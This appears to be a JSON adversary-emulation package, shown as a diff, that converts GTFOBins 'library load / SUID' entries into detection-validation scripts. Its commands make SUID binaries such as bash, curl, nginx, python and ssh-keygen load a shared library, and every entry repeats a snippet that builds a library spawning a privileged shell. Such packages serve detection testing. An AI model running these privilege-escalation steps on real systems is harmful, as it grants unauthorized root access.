@@ -1,0 +1,799 @@
+{
+  "package_id": "gtfobins-library-load-suid-v1",
+  "package_name": "GTFOBins - Library Load / Suid",
+  "version": "1.0.0",
+  "summary": "14 source-derived GTFOBins Living-Off-The-Land procedures for library load / Suid.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 14 distinct source procedures grouped by library-load / Suid.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Library Load",
+  "mitre_tcodes": [
+    "T1574"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 14
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_payload_path",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: /path/to/lib\\.so.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:bash:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - bash - Library load - Suid [b37df37]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: bash. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bash -p -c 'enable -f #{lotl_gtfobins_payload_path} x'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bash",
+        "source_bin": "bash",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {
+          "code": "bash -p -c 'enable -f /path/to/lib.so x'"
+        },
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bash:library-load:0:suid::",
+        "source_name": "bash",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bash` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:curl:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - curl - Library load - Suid [6034492]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: curl. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "curl --engine #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/curl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/curl",
+        "source_bin": "curl",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:curl:library-load:0:suid::",
+        "source_name": "curl",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `curl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ffmpeg:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - ffmpeg - Library load - Suid [abbec78]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ffmpeg. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=#{lotl_gtfobins_payload_path} #{lotl_gtfobins_local_path}.wav\nreset^J",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ffmpeg",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ffmpeg",
+        "source_bin": "ffmpeg",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ffmpeg:library-load:0:suid::",
+        "source_name": "ffmpeg",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ffmpeg` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gdb:library-load:0:suid:0:gdb>python",
+      "name": "GTFOBINS - T1574 - gdb - Library load - Suid [ed996f0]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: gdb. Context: SUID. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gdb -nx -ex 'python ...' -ex quit\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gdb",
+        "source_bin": "gdb",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "gdb",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "gdb",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gdb:library-load:0:suid:0:gdb>python",
+        "source_name": "gdb",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ldconfig:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - ldconfig - Library load - Suid [f735000]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ldconfig. Context: SUID. This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system. First identify the shared libraries used by the target program, for example: ``` $ ldd /bin/ping | grep libcap libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000) ``` Then create the shared library override, named `libcap.so.2`, and put in in `/path/to/...",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/temp-dir/ >#{lotl_gtfobins_local_path}\nldconfig -f #{lotl_gtfobins_local_path}\nping",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ldconfig",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ldconfig",
+        "source_bin": "ldconfig",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ldconfig:library-load:0:suid::",
+        "source_name": "ldconfig",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ldconfig` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:mysql:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - mysql - Library load - Suid [4c2b246]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: mysql. Context: SUID. The following loads the `/path/to/lib.so` shared object.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mysql --default-auth ../../../../../path/to/lib",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/mysql",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/mysql",
+        "source_bin": "mysql",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "version": "5.5"
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:mysql:library-load:0:suid::",
+        "source_name": "mysql",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `mysql` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:nginx:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - nginx - Library load - Suid [14530f5]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: nginx. Context: SUID. Alternatively, the `ssl_engine` directive can be used.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >#{lotl_gtfobins_local_path} <<EOF\nload_module #{lotl_gtfobins_payload_path};\nEOF\n\nnginx -t -c #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nginx",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nginx",
+        "source_bin": "nginx",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nginx:library-load:0:suid::",
+        "source_name": "nginx",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `nginx` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:openssl:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - openssl - Library load - Suid [011f04c]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: openssl. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "openssl req -engine ./lib.so",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/openssl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/openssl",
+        "source_bin": "openssl",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:openssl:library-load:0:suid::",
+        "source_name": "openssl",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `openssl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:python:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - python - Library load - Suid [d0d5f18]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: python. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/python",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/python",
+        "source_bin": "python",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:python:library-load:0:suid::",
+        "source_name": "python",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `python` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ssh-keygen:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - ssh-keygen - Library load - Suid [f07338c]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ssh-keygen. Context: SUID. The shared library must contain the `void C_GetFunctionList() {}` function.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ssh-keygen -D #{lotl_gtfobins_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ssh-keygen",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ssh-keygen",
+        "source_bin": "ssh-keygen",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ssh-keygen:library-load:0:suid::",
+        "source_name": "ssh-keygen",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ssh-keygen` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tclsh:library-load:0:suid::",
+      "name": "GTFOBINS - T1574 - tclsh - Library load - Suid [de3cb43]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: tclsh. Context: SUID.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tclsh\nload #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tclsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tclsh",
+        "source_bin": "tclsh",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tclsh:library-load:0:suid::",
+        "source_name": "tclsh",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `tclsh` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:vim:library-load:0:suid:0:vim>python",
+      "name": "GTFOBINS - T1574 - vim - Library load - Suid [73a813f]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: vim. Context: SUID. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "vim -c ':py ...'\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/vim",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/vim",
+        "source_bin": "vim",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "vim",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "vim",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:vim:library-load:0:suid:0:vim>python",
+        "source_name": "vim",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `vim` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:volatility:library-load:0:suid:0:volatility>python",
+      "name": "GTFOBINS - T1574 - volatility - Library load - Suid [91393ef]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: volatility. Context: SUID. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "volatility -f /path/to/core-dump volshell\n...\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/volatility",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/volatility",
+        "source_bin": "volatility",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "volatility",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "volatility",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:volatility:library-load:0:suid:0:volatility>python",
+        "source_name": "volatility",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `volatility` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    },
+    {
